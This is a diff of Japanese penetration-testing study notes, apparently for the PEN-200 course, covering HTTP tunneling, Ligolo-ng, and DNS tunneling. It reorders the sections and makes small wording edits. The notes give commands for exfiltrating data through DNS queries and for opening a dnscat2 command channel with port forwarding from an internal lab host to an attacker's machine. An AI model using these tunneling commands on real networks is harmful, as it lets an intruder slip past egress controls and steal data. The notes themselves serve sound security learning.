@@ -13,14 +13,15 @@
 	- DNS通信が許可されているとき：[DNS Tunneling](#DNS%20Tunneling)
 
 ---
+---
 
 # HTTP Tunneling
 
 ## HTTP Tunnelingの原理
 
 - 下図のように、HTTPのインバウンド通信のみが許可されている状況では、SSH通信によるポートフォワーディングも、リバースシェルの確立もできない
-- HTTPでトンネリングすることで、ローカルNW上にアクセスすることが可能になる
-	- SSH通信をHTTPでカプセル化するなど
+- ここで、HTTPでトンネリングすることで、ローカルNW上にアクセスすることが可能になる
+	- SSH通信をHTTPでカプセル化するなども可能
 
 ![](../../../画像ファイル/Pasted%20image%2020250926065949.png)
 
@@ -102,85 +103,11 @@ tcp_connect_time_out 800
 >- Proxychains は sudo と一緒に使う
 
 ---
----
 
-# DNS Tunneling
-
-## DNS Tunnelingの原理
-
-- 解説にあたっての前提：
-	- ローカルNWからはWAN上にあるマシンに直接アクセスできない（下図PGDATABASE01)
-	- DNSリゾルバ（名前解決を請け負う）がローカルNWと通信可能（下図MULTISERVER03）
-	- 権威サーバー(名前解決情報を持つ)がWANにある（下図FELINEAUTHORITY）
-
-- 留意点：DNSは少量のデータしか１つのパケットでやり取りできないので、大きなデータは複数バイトに分割してやり取りしている
-
-### データが外に出る仕組み
-
-- ローカルNWから権威サーバーが持つ名前解決データを問い合わせると、DNSリゾルバが名前解決のために問い合わせ内容を権威サーバーに転送する
-```zsh
-nslookup exfiltrated-data.feline.corp
-```
-- ↓ローカルNWからWAN上の権威サーバーにデータが流出する
-```zsh
-...
-04:57:40.721682 IP [DNSリゾルバのIP].65122 > [権威サーバのIP].domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)
-```
-
-### データが内に入る仕組み
-
-- 権威サーバーがTXTレコードを保有していて、それをローカルNWから問い合わせると、内部に権威サーバーのTXTレコード情報が流入する
-```zsh
-nslookup -type=txt [domain]
-```
-	↓
-```zsh
-...
-Non-authoritative answer:
-[domain]      text = "[string]"
-```
-![](../../../画像ファイル/Pasted%20image%2020250927150533.png)
-$$DNSリゾルバを介してデータが漏洩・侵入するイメージ(PEN-200)$$
-
----
-
-## DNS Tunneling w/ Dnscat2
-
-1. 権威サーバー上（上図ではFELINEAUTHORITY)でdnscat2 serverを起動
-```zsh
-dnscat2-server [domain]
-```
-
-2. DNSクライアント(上図ではPGDATABASE01)でdnscat2 clientを起動
-```zsh
-./dnscat [domain]
-```
-- →接続が確立すると、dnscat2 clientに"Session established!"と出力
-
-3. 権威サーバー上でdnscat2コマンドシェルを使用（`dnscat2>`プロンプト）
-```zsh
-# アクティブなウィンドウをリストアップ
-windows
-
-# 表示されたウィンドウを使用（windowsではないので注意）
-window -i 1
-
-# listenコマンド(SSH -Lと同様）でローカルポートフォワーディング
-listen 0.0.0.0:[リッスンポート(1025以上任意)] [DestIP]:[Port]
-```
-
-4. 攻撃者のマシンからリッスンポートにアクセスし任意の操作をする
-```zsh
-# 例：smbclientの場合
-smbclient -U victim --password=victimpass -p [リッスンポート] -L //[権威サーバーIP]/
-```
-
----
----
 
 # Ligolo-ng
 
-[公式Doc](https://docs.ligolo.ng/)
+🔗[公式ドキュメント](https://docs.ligolo.ng/)
 
 - 用途：chiselと同様
 - 動作原理：chiselなどはSOCKSプロキシベースのツールだが、これはTUNインターフェースを使用してVPNのように動作する
@@ -373,4 +300,80 @@ sudo ip route add 240.0.0.1/32 dev ligolo
 2. Agentのローカルサービスにアクセスする
 ```zsh
 ssh <user>@240.0.0.1
+```
+
+
+---
+---
+
+# DNS Tunneling
+
+## DNS Tunnelingの原理
+
+- 解説にあたっての前提：
+	- ローカルNWからはWAN上にあるマシンに直接アクセスできない（下図PGDATABASE01)
+	- DNSリゾルバ（名前解決を請け負う）がローカルNWと通信可能（下図MULTISERVER03）
+	- 権威サーバー(名前解決情報を持つ)がWANにある（下図FELINEAUTHORITY）
+
+- 留意点：DNSは少量のデータしか１つのパケットでやり取りできないので、大きなデータは複数バイトに分割してやり取りしている
+
+### データが外に出る仕組み
+
+- ローカルNWから権威サーバーが持つ名前解決データを問い合わせると、DNSリゾルバが名前解決のために問い合わせ内容を権威サーバーに転送する
+```zsh
+nslookup exfiltrated-data.feline.corp
+```
+- ↓ローカルNWからWAN上の権威サーバーにデータが流出する
+```zsh
+...
+04:57:40.721682 IP [DNSリゾルバのIP].65122 > [権威サーバのIP].domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)
+```
+
+### データが内に入る仕組み
+
+- 権威サーバーがTXTレコードを保有していて、それをローカルNWから問い合わせると、内部に権威サーバーのTXTレコード情報が流入する
+```zsh
+nslookup -type=txt <domain>
+```
+	↓
+```zsh
+...
+Non-authoritative answer:
+<domain>      text = "[string]"
+```
+
+![](../../../画像ファイル/Pasted%20image%2020250927150533.png)
+
+$$DNSリゾルバを介してデータが漏洩・侵入するイメージ(PEN-200)$$
+
+
+## DNS Tunneling w/ Dnscat2
+
+1. 権威サーバー上（上図ではFELINEAUTHORITY)でdnscat2 serverを起動
+```zsh
+dnscat2-server <domain>
+```
+
+2. DNSクライアント(上図ではPGDATABASE01)でdnscat2 clientを起動
+```zsh
+./dnscat <domain>
+```
+- →接続が確立すると、dnscat2 clientに"Session established!"と出力
+
+3. 権威サーバー上でdnscat2コマンドシェルを使用（`dnscat2>`プロンプト）
+```zsh
+# アクティブなウィンドウをリストアップ
+windows
+
+# 表示されたウィンドウを使用（windowsではないので注意）
+window -i 1
+
+# listenコマンド(SSH -Lと同様）でローカルポートフォワーディング
+listen 0.0.0.0:[リッスンポート(1025以上任意)] [DestIP]:[Port]
+```
+
+4. 攻撃者のマシンからリッスンポートにアクセスし任意の操作をする
+```zsh
+# 例：smbclientの場合
+smbclient -U victim --password=victimpass -p [リッスンポート] -L //[権威サーバーIP]/
 ```
